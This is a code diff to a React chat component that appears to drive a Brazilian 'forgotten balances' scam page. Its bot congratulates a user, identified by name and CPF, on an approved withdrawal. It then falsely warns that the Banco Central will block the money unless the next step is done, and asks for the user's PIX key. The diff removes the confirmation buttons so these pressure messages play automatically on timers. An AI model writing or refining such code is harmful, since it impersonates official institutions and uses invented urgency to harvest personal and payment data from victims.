@@ -77,9 +77,26 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setLeadValue(formattedVal);
         
         setTyping(false);
-        addBotMessage(`Parabéns, **${name}**!\n\nA sua **solicitação de saque foi aprovada** no valor de **${formattedVal}** referentes a saldos esquecidos no CPF ${data.docValue}.`, [
-          { text: "Efetuar saque", action: "confirm_identity" }
-        ]);
+        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`);
+        
+        // Show second message after 2 seconds
+        setTimeout(() => {
+          setTyping(true);
+          setTimeout(() => {
+            setTyping(false);
+            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`);
+            
+            // Show third message after 2 seconds
+            setTimeout(() => {
+              setTyping(true);
+              setTimeout(() => {
+                setTyping(false);
+                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`);
+                setAwaitingPix(true);
+              }, 1500);
+            }, 2000);
+          }, 1500);
+        }, 2000);
       } catch (e) {
         setTyping(false);
         addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
@@ -108,34 +125,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   };
 
   const handleAction = async (action: string, payload?: string) => {
-    if (action === "confirm_identity") {
-      setMessages(prev => {
-        const newMessages = [...prev];
-        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
-        return newMessages;
-      });
-      setTyping(true);
-      setTimeout(() => {
-        setTyping(false);
-        addBotMessage("**ATENÇÃO:** Após essa solicitação para saque, **você irá iniciar o seu recebimento do saque imediato**, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.", [
-          { text: "Efetuar Saque", action: "request_pix" }
-        ]);
-      }, 1000);
-    } 
-    else if (action === "request_pix") {
-      setMessages(prev => {
-        const newMessages = [...prev];
-        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
-        return newMessages;
-      });
-      setTyping(true);
-      setTimeout(() => {
-        setTyping(false);
-        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua **Chave PIX** de preferência:`);
-        setAwaitingPix(true);
-      }, 1000);
-    }
-    else if (action === "submit_pix") {
+    if (action === "submit_pix") {
       const pix = payload || inputValue;
       if (!pix) return;
       
